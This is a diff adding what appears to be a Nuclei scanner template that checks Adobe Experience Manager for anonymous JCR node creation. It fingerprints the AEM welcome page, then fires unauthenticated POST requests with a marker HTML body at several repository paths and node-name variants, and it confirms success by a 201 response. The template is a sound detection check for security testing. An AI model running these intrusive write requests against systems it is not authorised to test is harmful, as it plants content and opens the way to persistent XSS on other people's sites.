@@ -1,0 +1,75 @@
+id: aem-anonymous-write
+
+info:
+  name: Adobe Experience Manager (AEM) - Anonymous JCR Node Creation
+  author: DhiyaneshDk,0ang3el
+  severity: high
+  description: |
+    Anonymous users can create new JCR nodes via the AEM POST Servlet, which may allow attackers to inject malicious content, achieve persistent XSS, or abuse servlets registered by resource types for further attacks.
+  reference:
+    - https://clarkvoss.medium.com/the-cve-that-will-never-die-86149b450840
+    - https://github.com/0ang3el/aem-hacker/blob/master/aem_hacker.py
+  metadata:
+    verified: true
+    fofa-query: body="/libs/granite/core/content/login.html"
+  tags: aem,adobe,intrusive,node
+
+flow: http(1) && http(2)
+
+variables:
+  nodename: "{{to_lower(rand_text_alpha(5))}}"
+  random: "{{to_lower(rand_text_alpha(10))}}"
+  marker: "{{to_lower(rand_text_alpha(6))}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    redirects: true
+    max-redirects: 2
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Welcome to Adobe Experience Manager"
+        internal: true
+
+  - raw:
+      - |
+        POST {{path}}{{extension}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        <html>{{marker}}</html>
+    payloads:
+      path:
+        - '/'
+        - '/apps/'
+        - '/libs/'
+        - '/content/'
+        - '/content/usergenerated/'
+        - '/content/usergenerated/etc/commerce/smartlists/'
+
+      extension:
+        - '{{nodename}}*'
+        - '{{nodename}}.json'
+        - '{{nodename}}.1.json'
+        - '{{nodename}}.json/{{random}}.css'
+        - '{{nodename}}.json/{{random}}.html'
+
+    attack: clusterbomb
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<td>Parent Location</td>'
+
+      - type: status
+        status:
+          - 201
